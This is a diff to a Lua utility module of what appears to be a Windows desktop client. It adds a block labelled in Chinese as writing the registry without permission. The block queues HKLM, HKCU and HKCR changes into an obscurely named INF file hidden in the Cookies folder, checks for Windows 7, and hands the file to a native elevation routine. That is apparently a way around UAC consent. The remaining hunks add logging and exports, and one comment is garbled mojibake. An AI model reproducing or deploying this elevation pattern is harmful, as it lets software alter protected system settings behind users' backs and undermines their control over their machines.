@@ -625,6 +625,146 @@ function RegSetValue(sPath, value)
 	return false
 end
 
+----------------------
+--无权限写注册表-----
+local g_tSetValueInf = {}
+g_tSetValueInf["AddReg"] = {}
+g_tSetValueInf["DelReg"] = {}
+
+function CheckIs64OS()
+	if type(tipUtil.GetAllSystemInfo) == "function" then
+		local tabSystemInfo =  tipUtil:GetAllSystemInfo()
+		if type(tabSystemInfo) == "table" then
+			iBits = tabSystemInfo["BitNumbers"]
+			if type(iBits) == "number" and iBits == 64 then
+				return true
+			end
+		end
+	end
+
+	return false
+end
+
+function IsUACOS()
+	local bRet = true
+	local iMax, iMin = tipUtil:GetOSVersion()
+	if type(iMax) == "number" and iMax <= 5 then
+		bRet = false
+	end
+	return bRet
+end
+
+function IsUserAdmin()
+	local bRet = false
+	if type(tipUtil.GetProcessElevation) == "function" then
+		local bResult, iElevation, bAdmin = tipUtil:GetProcessElevation()
+		if (bResult and iElevation == 2 and bAdmin) or not bResult then
+			bRet = true
+		end
+	elseif not IsUACOS() then
+		bRet = true
+	end
+	return bRet
+end
+
+function SetRegValueInUAC(sRegRoot, sRegPath, sRegKey , value)
+	local strHKRoot = ""
+		
+	if sRegRoot == "HKEY_CURRENT_USER" then
+		strHKRoot = "HKCU"
+	elseif sRegRoot == "HKEY_LOCAL_MACHINE" then 
+		strHKRoot = "HKLM"
+	elseif sRegRoot == "HKEY_CLASSES_ROOT" then
+		strHKRoot = "HKCR"
+	end
+		
+	if not IsRealString(strHKRoot) then
+		return false
+	end
+	
+	if not IsRealString(sRegKey) then
+		sRegKey = "\"\""
+	end
+
+	local nIndex = #g_tSetValueInf["AddReg"]
+	g_tSetValueInf["AddReg"][nIndex+1] = strHKRoot..","..sRegPath..","..sRegKey..",".."FLG_ADDREG_TYPE_SZ,"..value
+	
+	return true
+end
+
+function DelRegValueInUAC(sRegRoot, sRegPath, sRegKey)
+	local strHKRoot = ""
+		
+	if sRegRoot == "HKEY_CURRENT_USER" then
+		strHKRoot = "HKCU"
+	elseif sRegRoot == "HKEY_LOCAL_MACHINE" then 
+		strHKRoot = "HKLM"
+	elseif sRegRoot == "HKEY_CLASSES_ROOT" then
+		strHKRoot = "HKCR"
+	end
+		
+	if not IsRealString(strHKRoot) then
+		return false
+	end
+	
+	if not IsRealString(sRegKey) then
+		sRegKey = "\"\""
+	end
+
+	local nIndex = #g_tSetValueInf["DelReg"]
+	g_tSetValueInf["DelReg"][nIndex+1] = strHKRoot..","..sRegPath..","..sRegKey
+	
+	return true
+end
+
+function CommitRegOperation()
+	local bPassCheck = CheckRegCondition()
+	if not bPassCheck then
+		TipLog("[CommitRegOperation] CheckRegCondition failed")
+		return false
+	end
+	
+	local strInfPath = GetInfPathForReg()
+	local b64Bit = CheckIs64OS()
+	local nRet = tipUtil:ElevateOperate(g_tSetValueInf, strInfPath, b64Bit)
+	
+	g_tSetValueInf["AddReg"] = {}
+	g_tSetValueInf["DelReg"] = {}
+	
+	if nRet == 0 then
+		return true
+	else
+		return false
+	end
+end
+
+function CheckRegCondition()
+	if type(tipUtil.ElevateOperate) ~= "function" then
+		return false
+	end
+	local iMax, iMin = tipUtil:GetOSVersion()
+	if type(iMax) ~= "number" or iMax ~= 6 
+		or type(iMin) ~= "number" or iMin ~= 1 then
+		return false  --涓嶆槸win7
+	end
+	
+	return true
+end
+
+function GetInfPathForReg()
+	local CSIDL_COOKIES = 0x21
+	local strCookieDir = tipUtil:GetSpecialFolderPathEx(CSIDL_COOKIES)
+	if not IsRealString(strCookieDir) or not tipUtil:QueryFileExists(strCookieDir) then
+		return ""
+	end
+	
+	local strFileName = "XX7T6KF.inf"
+	local strInfPath = tipUtil:PathCombine(strCookieDir, strFileName)
+	return strInfPath
+end
+
+--无权限写注册表-----
+----------------------
 
 local bHasInitAcc = false
 function AccelerateFlash(fRate)
@@ -2189,10 +2329,13 @@ function DownLoadConfigByURL(strConfigURL, fnCallBack, nTimeInMs)
 	, function(bRet, strRealPath)
 		TipLog("[DownLoadServerConfig] bRet:"..tostring(bRet)
 				.." strRealPath:"..tostring(strRealPath))
-				
+		
+		TipLog("[DownLoadServerConfigXXX] fnCallBack(0, strSavePath)")	
 		if 0 == bRet then
+			TipLog("[DownLoadServerConfig] fnCallBack(0, strSavePath)")
 			fnCallBack(0, strSavePath)
 		else
+			TipLog("[DownLoadServerConfig] fnCallBack(bRet)")
 			fnCallBack(bRet)
 		end		
 	end, nTime)
@@ -2371,6 +2514,7 @@ obj.tipAsynUtil = tipAsynUtil
 --通用
 obj.TipLog = TipLog
 obj.IsUACOS = IsUACOS
+obj.CheckIs64OS = CheckIs64OS
 obj.FailExitTipWnd = FailExitTipWnd
 obj.TipConvStatistic = TipConvStatistic
 obj.DelayTipConvStatistic = DelayTipConvStatistic
@@ -2488,6 +2632,9 @@ obj.SaveAutoUpdateUTC = SaveAutoUpdateUTC
 obj.RegQueryValue = RegQueryValue
 obj.RegDeleteValue = RegDeleteValue
 obj.RegSetValue = RegSetValue
+obj.SetRegValueInUAC = SetRegValueInUAC
+obj.DelRegValueInUAC = DelRegValueInUAC
+obj.CommitRegOperation = CommitRegOperation
 
 --悬浮窗
 obj.InitToolTip = InitToolTip
